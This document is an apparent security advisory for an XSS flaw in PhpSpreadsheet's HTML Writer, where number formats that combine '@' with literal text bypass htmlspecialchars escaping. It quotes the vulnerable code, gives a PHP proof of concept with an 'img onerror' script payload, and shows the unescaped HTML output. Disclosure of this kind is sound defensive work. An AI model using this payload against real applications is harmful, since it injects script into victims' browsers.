summary: "PhpSpreadsheet has XSS via NumberFormat @ Text Substitution in HTML Writer\n### Summary\n\
  The HTML Writer in PhpSpreadsheet bypasses `htmlspecialchars()` output escaping when a cell\
  \ uses a custom number format containing the `@` text placeholder with additional literal\
  \ text (e.g., `@ \"items\"` or `\"Total: \"@`). This allows an attacker to inject arbitrary\
  \ HTML and JavaScript into the generated HTML output by crafting a malicious XLSX file.\n\n\
  ### Details\n\n\n#### 1. Conditional escaping in `Html.php:1586-1594`\n\n```php\n$cellData\
  \ = NumberFormat::toFormattedString(\n    $origData2,\n    $formatCode ?? NumberFormat::FORMAT_GENERAL,\n\
  \    [$this, 'formatColor']\n);\n\nif ($cellData === $origData) {\n    $cellData = htmlspecialchars($cellData,\
  \ Settings::htmlEntityFlags());\n}\n```\n\n`htmlspecialchars()` is only called when `$cellData\
  \ === $origData` (strict comparison). If the formatted output differs from the original value\
  \ in any way, escaping is skipped entirely.\n\n#### 2. Early return in `Formatter.php:136-152`\n\
  \n```php\nif (preg_match(self::SECTION_SPLIT, $format) === 0\n    && preg_match(self::SYMBOL_AT,\
  \ $formatx) === 1) {\n    if (!str_contains($format, '\"')) {\n        return str_replace('@',\
  \ /* raw value */, $format);\n    }\n    return str_replace(/* ... preg_replace with raw value\
  \ ... */);\n}\n```\n\nWhen the format code contains `@` with additional literal text (e.g.,\
  \ `@ \"items\"`), the formatter substitutes the raw cell value into the format string and\
  \ **returns early** — the `formatColor` callback (which would have applied `htmlspecialchars`)\
  \ is never invoked.\n\n\n### PoC\n\n**test.php**\n``` php\n<?php\n\nrequire '/app/vendor/autoload.php';\n\
  \nuse PhpOffice\\PhpSpreadsheet\\Spreadsheet;\nuse PhpOffice\\PhpSpreadsheet\\Writer\\Html;\n\
  \n$spreadsheet = new Spreadsheet();\n$sheet = $spreadsheet->getActiveSheet();\n\n$payload\
  \    = '<img src=x onerror=alert(document.domain)>';\n$formatCode = '@ \"items\"';\n\n\n$sheet->setCellValue('A1',\
  \ $payload);\n$sheet->getStyle('A1')->getNumberFormat()->setFormatCode($formatCode);\n\n$writer\
  \ = new Html($spreadsheet);\n$html = $writer->generateHTMLAll();\n\nfile_put_contents('/app/output.html',\
  \ $html);\n\necho \"HTML output saved to /app/output.html\\n\";\n```\n\nThe produced output\
  \ contains unescaped data.\n``` html\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\"\
  \ \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\n<html xmlns=\"http://www.w3.org/1999/xhtml\"\
  >\n  <head>\n      <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"\
  \ />\n      <meta name=\"generator\" content=\"PhpSpreadsheet, https://github.com/PHPOffice/PhpSpreadsheet\"\
  \ />\n      <title>Untitled Spreadsheet</title>\n      <meta name=\"author\" content=\"Unknown\
  \ Creator\" />\n      <meta name=\"title\" content=\"Untitled Spreadsheet\" />\n      <meta\
  \ name=\"lastModifiedBy\" content=\"Unknown Creator\" />\n      <meta name=\"created\" content=\"\
  2026-04-02T16:34:44+00:00\" />\n      <meta name=\"modified\" content=\"2026-04-02T16:34:44+00:00\"\
  \ />\n    <style type=\"text/css\">\n[..SNIP..]\n    </style>\n  </head>\n\n  <body>\n<div\
  \ style='page: page0'>\n    <table border='0' cellpadding='0' cellspacing='0' id='sheet0'\
  \ class='sheet0 gridlines'>\n        <col class=\"col0\" />\n        <tbody>\n          <tr\
  \ class=\"row0\">\n            <td class=\"column0 style1 s\"><img src=x onerror=alert(document.domain)>\
  \ items</td>\n          </tr>\n    </tbody></table>\n</div>\n  </body>\n</html>\n```\n\n<img\
  \ width=\"719\" height=\"716\" alt=\"Screenshot 2026-04-02 at 18 45 53\" src=\"https://github.com/user-attachments/assets/b758b063-a2d1-4e76-87bb-931eae81dbfe\"\
  \ />\n\n\n\n### Impact\n\nThe impact changes based on the way the HTML is served. \nIn case\
  \ it is served from the web server it is typical XSS, in case the file is downloaded and opened\
  \ locally, the attack vector is more limited."
